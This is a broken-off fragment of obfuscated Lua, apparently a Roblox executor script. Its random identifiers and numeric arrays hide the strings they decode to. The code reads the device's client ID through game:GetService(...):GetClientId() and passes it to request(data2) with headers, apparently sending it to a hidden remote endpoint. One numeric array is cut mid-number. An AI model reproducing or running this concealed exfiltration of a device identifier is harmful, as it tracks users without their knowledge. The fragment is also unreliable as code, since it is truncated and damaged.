            .. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2400,1960,1940,1980,1480,2140,1540,2380,1980,2360,1740,2240,2340,1360,1960,1480,1580,1660,1680,2220,1660,1780,2320,2280,1700,1420,2140,1640,1440,1500,2080,1300,1600,2180,1600,2340,2020,2140,1980,1380,2260,1320,1320,1780,1460,2140,1700,1340,1780,2160,2320,2120,1660,1420,2200,1500,2100,2240,1460,1720,960,2160,1380,1460,1340,1300,1080,1500,2100,2220,2060,1780,1420,1320,2060})) .. game:GetService(WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({1940,1380,2000,2000,1600,1540,1400,2420,2240,2020,1700,2100,2260,2120,1320,2420,2240,1980,1500,1760,1540,1560,1720,1340,1440,1680,1940,1500,1320,2280,1760,2040,2280,1440,2320,2200,2260,2080,1460,1420,1780,1420,2300,1640,1780,1420,2300,1540,2180,1380,2120,2060,1700,1340,1380,1700,2180,1480,1040,1620,1740,1060,2080,1960,1440,2160,960,1940,1740,1560,2440,1700,1000,1720,2420,2000,2180,2160,2120,1800,1620,1220,1220}))):GetClientId() .. WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2280,2220,2380,1380,2100,2320,1780,2160,1
WTRtdadYCSAHOWVFTUOpgXnsfzlOMQCtntByAwWnyPDoTsAlvGkDDmDGLslArzrhwSBedInaDvwXzdyBIniaiwhnhME(GdidTkzXqYpeCiBUjgiZGmKlsjpszUDBbppxnTb({2060,1380,2120,1420,2160,1680,2080,2420,2300,2020,2220,2020,1640,1600,2000,2080,1980,2160,2400,1340,2120,2360,2340,2400,1680,2180,1660,2260,1460,1760,1780,1720,2020,1940,1740,1500,2380,1300,1500,1440,1540,1500,1300,1540,2160,2120,2140,2180,1400,1500,2140,1520,1960,2140,1740,1700,1380,1140,1680,1720,1300,1220,1220})),
    Headers = headers
}

request(data2)
        
